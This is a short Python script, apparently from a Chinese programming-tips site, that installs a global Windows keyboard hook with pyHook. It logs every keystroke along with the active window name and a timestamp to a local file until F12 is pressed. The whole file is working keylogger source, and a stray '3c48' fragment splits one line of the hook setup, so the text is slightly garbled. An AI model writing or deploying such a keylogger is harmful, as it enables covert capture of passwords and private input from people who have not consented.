
# -*- coding: cp936 -*-
import pythoncom  
import pyHook  
import time
import win32api
t=''
asciistr=''
keystr=''
def onKeyboardEvent(event):   
    global t,asciistr,keystr
    filename='d://test.txt'
    wrfile=open(filename,'ab')
    "处理键盘事件"
    if t==str(event.WindowName):
        asciistr=asciistr+chr(event.Ascii)
        keystr=keystr+str(event.Key)
        
    else:
        t=str(event.WindowName)
        if asciistr=='' and keystr=='':
            wrfile.writelines("\nWindow:%s\n" % str(event.Window))
            wrfile.writelines("WindowName:%s\n" % str(event.WindowName)) #写入当前窗体名
            wrfile.writelines("MessageName:%s\n" % str(event.MessageName))
            wrfile.writelines("Message:%d\n" % event.Message)
            wrfile.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S',time.localtime()))
        else:
            wrfile.writelines("Ascii_char:%s\n" %asciistr)
            wrfile.writelines("Key_char:%s\n" %keystr)
            wrfile.writelines("\nWindow:%s\n" % str(event.Window))
            wrfile.writelines("WindowName:%s\n" % str(event.WindowName)) #写入当前窗体名
            wrfile.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S',time.localtime()))
        
        asciistr=chr(event.Ascii)
        keystr=str(event.Key)
    if str(event.Key)=='F12':  #按下F12后终止
        wrfile.writelines("Ascii_char:%s\n" %asciistr)
        wrfile.writelines("Key_char:%s\n" %keystr)
        wrfile.close()    
        win32api.PostQuitMessage()
        
    return True    

if __name__ == "__main__":
    '''
www.iplaypy.com
'''

    #创建hook句柄  
    hm = pyHook.HookManager()  

    #监控键盘  
    h
3c48
m.KeyDown = onKeyboardEvent  
    hm.HookKeyboard()  

    #循环获取消息  
    pythoncom.PumpMessages(10000)  
      